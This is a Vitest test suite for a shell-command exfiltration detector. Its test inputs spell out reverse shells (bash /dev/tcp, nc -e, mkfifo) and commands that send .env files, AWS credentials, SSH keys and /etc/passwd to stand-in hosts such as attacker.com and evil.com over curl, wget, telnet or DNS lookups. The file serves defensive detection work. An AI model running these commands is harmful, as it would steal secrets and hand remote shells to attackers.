import { describe, it, expect } from 'vitest';
import { detectNetworkExfiltration } from '../network-exfiltration';

describe('detectNetworkExfiltration', () => {
  describe('Reverse Shells', () => {
    it('should detect bash reverse shell via /dev/tcp', async () => {
      const result = await detectNetworkExfiltration({
        command: 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
      });

      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
      expect(result?.message).toContain('Reverse shell');
    });

    it('should detect sh reverse shell', async () => {
      const result = await detectNetworkExfiltration({
        command: 'sh -i >& /dev/tcp/attacker.com/8080 0>&1',
      });

      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect nc reverse shell with -e flag', async () => {
      const result = await detectNetworkExfiltration({
        command: 'nc -e /bin/bash 192.168.1.100 4444',
      });

      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect nc piped reverse shell', async () => {
      const result = await detectNetworkExfiltration({
        command: 'nc attacker.com 4444 | /bin/bash',
      });

      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect mkfifo reverse shell', async () => {
      const result = await detectNetworkExfiltration({
        command: 'mkfifo /tmp/f; nc attacker.com 4444 < /tmp/f | /bin/sh > /tmp/f',
      });

      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });
  });

  describe('Piped Network Operations', () => {
    it('should detect cat piped to nc', async () => {
      const result = await detectNetworkExfiltration({
        command: 'cat /etc/passwd | nc attacker.com 9999',
      });

      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
      expect(result?.message).toContain('piped to network');
    });

    it('should detect cat secret piped to curl POST', async () => {
      const result = await detectNetworkExfiltration({
        command: 'cat .env | curl -X POST -d @- https://evil.com/collect',
      });

      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect grep piped to wget', async () => {
      const result = await detectNetworkExfiltration({
        command: 'grep API_KEY .env | wget --post-data @- https://attacker.com',
      });

      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect sensitive file piped to telnet', async () => {
      const result = await detectNetworkExfiltration({
        command: 'cat .aws/credentials | telnet evil.com 1234',
      });

      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });
  });

  describe('Encoded Exfiltration', () => {
    it('should detect base64 encoding with curl', async () => {
      const result = await detectNetworkExfiltration({
        command: 'cat .env | base64 | curl -d @- https://pastebin.com',
      });

      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
      expect(result?.message).toContain('Encoded data transmission');
    });

    it('should detect xxd encoding with network transmission', async () => {
      const result = await detectNetworkExfiltration({
        command: 'cat secret.txt | xxd | nc attacker.com 8080',
      });

      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect hexdump with wget', async () => {
      const result = await detectNetworkExfiltration({
        command: 'hexdump -C private.key | wget --post-data=@- evil.com',
      });

      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });
  });

  describe('DNS Exfiltration', () => {
    it('should detect dig with command substitution', async () => {
      const result = await detectNetworkExfiltration({
        command: 'dig $(cat secret.txt).attacker.com',
      });

      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
      expect(result?.message).toContain('DNS exfiltration');
    });

    it('should detect nslookup with command substitution', async () => {
      const result = await detectNetworkExfiltration({
        command: 'nslookup `cat .env | base64`.evil.com',
      });

      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect host command with backticks', async () => {
      const result = await detectNetworkExfiltration({
        command: 'host `cat password`.attacker.com',
      });

      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });
  });

  describe('HTTP POST with Sensitive Files', () => {
    it('should detect curl POST of /etc/passwd', async () => {
      const result = await detectNetworkExfiltration({
        command: 'curl -X POST -d @/etc/passwd https://attacker.com/collect',
      });

      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
      expect(result?.message).toContain('sensitive file');
    });

    it('should detect curl POST of .env file', async () => {
      const result = await detectNetworkExfiltration({
        command: 'curl --data @.env https://evil.com',
      });

      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect wget POST of credentials', async () => {
      const result = await detectNetworkExfiltration({
        command: 'wget --post-file=.aws/credentials https://attacker.com',
      });

      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });
  });

  describe('File Upload Patterns', () => {
    it('should detect curl file upload with -F flag', async () => {
      const result = await detectNetworkExfiltration({
        command: 'curl -F file=@/etc/passwd https://attacker.com/upload',
      });

      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
      // File upload is detected via HTTP POST pattern (file uploads are POSTs)
      expect(result?.message).toMatch(/sensitive file|file upload/);
    });

    it('should detect curl upload of SSH key', async () => {
      const result = await detectNetworkExfiltration({
        command: 'curl -F file=@~/.ssh/id_rsa https://evil.com',
      });

      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect curl upload-file flag', async () => {
      const result = await detectNetworkExfiltration({
        command: 'curl --upload-file .env https://attacker.com',
      });

      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect curl -T upload', async () => {
      const result = await detectNetworkExfiltration({
        command: 'curl -T secret.key https://evil.com',
      });

      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });
  });

  describe('Suspicious Destinations', () => {
    it('should detect data sent to pastebin', async () => {
      const result = await detectNetworkExfiltration({
        command: 'curl -d "data" https://pastebin.com/api/new',
      });

      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
      expect(result?.message).toContain('Suspicious network destination');
    });

    it('should detect Discord webhook exfiltration', async () => {
      const result = await detectNetworkExfiltration({
        command: 'curl -X POST -d "content=secret" https://discord.com/api/webhooks/123/token',
      });

      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect Slack webhook exfiltration', async () => {
      const result = await detectNetworkExfiltration({
        command: 'curl -X POST -d "text=data" https://hooks.slack.com/services/T00/B00/XXX',
      });

      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect download to /dev/shm', async () => {
      const result = await detectNetworkExfiltration({
        command: 'wget -O /dev/shm/.hidden https://attacker.com/malware',
      });

      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect curl to raw IP address', async () => {
      const result = await detectNetworkExfiltration({
        command: 'curl http://192.168.1.100:8080/data',
      });

      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });
  });

  describe('Suspicious Git Operations', () => {
    it('should detect git push with credentials in URL', async () => {
      const result = await detectNetworkExfiltration({
        command: 'git push https://user:token@evil.com/repo.git',
      });

      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
      expect(result?.message).toContain('git remote');
    });

    it('should detect adding remote and pushing', async () => {
      const result = await detectNetworkExfiltration({
        command: 'git remote add origin https://attacker.com/repo.git && git push origin main',
      });

      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });
  });

  describe('Safe Operations (No Detection)', () => {
    it('should allow npm install', async () => {
      const result = await detectNetworkExfiltration({
        command: 'npm install express',
      });

      expect(result).toBeNull();
    });

    it('should allow yarn add', async () => {
      const result = await detectNetworkExfiltration({
        command: 'yarn add react',
      });

      expect(result).toBeNull();
    });

    it('should allow pip install', async () => {
      const result = await detectNetworkExfiltration({
        command: 'pip install requests',
      });

      expect(result).toBeNull();
    });

    it('should allow git clone from GitHub', async () => {
      const result = await detectNetworkExfiltration({
        command: 'git clone https://github.com/user/repo.git',
      });

      expect(result).toBeNull();
    });

    it('should allow git clone from GitLab', async () => {
      const result = await detectNetworkExfiltration({
        command: 'git clone https://gitlab.com/user/repo.git',
      });

      expect(result).toBeNull();
    });

    it('should allow legitimate API calls with curl', async () => {
      const result = await detectNetworkExfiltration({
        command: 'curl https://api.github.com/repos/user/repo',
      });

      expect(result).toBeNull();
    });

    it('should allow simple curl GET requests', async () => {
      const result = await detectNetworkExfiltration({
        command: 'curl -s https://example.com',
      });

      expect(result).toBeNull();
    });

    it('should allow wget of files', async () => {
      const result = await detectNetworkExfiltration({
        command: 'wget https://example.com/file.tar.gz',
      });

      expect(result).toBeNull();
    });

    it('should allow docker pull', async () => {
      const result = await detectNetworkExfiltration({
        command: 'docker pull nginx:latest',
      });

      expect(result).toBeNull();
    });

    it('should allow docker push', async () => {
      const result = await detectNetworkExfiltration({
        command: 'docker push myregistry.com/myimage:latest',
      });

      expect(result).toBeNull();
    });

    it('should allow cargo install', async () => {
      const result = await detectNetworkExfiltration({
        command: 'cargo install ripgrep',
      });

      expect(result).toBeNull();
    });

    it('should allow go get', async () => {
      const result = await detectNetworkExfiltration({
        command: 'go get github.com/user/package',
      });

      expect(result).toBeNull();
    });

    it('should allow API calls without sensitive data', async () => {
      const result = await detectNetworkExfiltration({
        command:
          'curl -X POST -H "Content-Type: application/json" -d \'{"key":"value"}\' https://api.example.com',
      });

      expect(result).toBeNull();
    });
  });

  describe('Edge Cases', () => {
    it('should handle empty commands', async () => {
      const result = await detectNetworkExfiltration({
        command: '',
      });

      expect(result).toBeNull();
    });

    it('should handle commands without network operations', async () => {
      const result = await detectNetworkExfiltration({
        command: 'cat /etc/passwd',
      });

      expect(result).toBeNull();
    });

    it('should handle network operations without sensitive data', async () => {
      const result = await detectNetworkExfiltration({
        command: 'echo "hello" | nc localhost 8080',
      });

      // This is NOT detected as suspicious because:
      // - It doesn't read sensitive files
      // - It doesn't use encoding
      // - The piped data is just a literal string
      expect(result).toBeNull();
    });
  });
});
